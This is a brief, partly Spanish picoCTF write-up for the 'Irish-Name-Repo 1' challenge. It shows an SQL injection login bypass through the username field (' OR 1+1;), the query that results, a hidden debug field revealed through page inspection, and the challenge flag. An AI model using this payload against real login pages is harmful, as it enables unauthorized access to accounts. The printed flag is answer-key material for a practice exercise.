# Irish-Name-Repo 1 

## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución
```bash
username: ' OR 1+1;
password: password
SQL query: SELECT * FROM users WHERE name='' OR 1+1;' AND password='password'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```

Se utilizo inyeccion SQL, se entro al login de la pagina, para despues inspeccionar la pagina y despues hacer que el cuadro de texto debug ahora sea visible, una vez hecho esto en el apartado de username se escribio: ' OR 1+1;'
Una vez escrito eso, un password cualquiera y en el recuadro de debug escribir 1, la pagina lanza la bandera

## Notas adicionales


## Referencias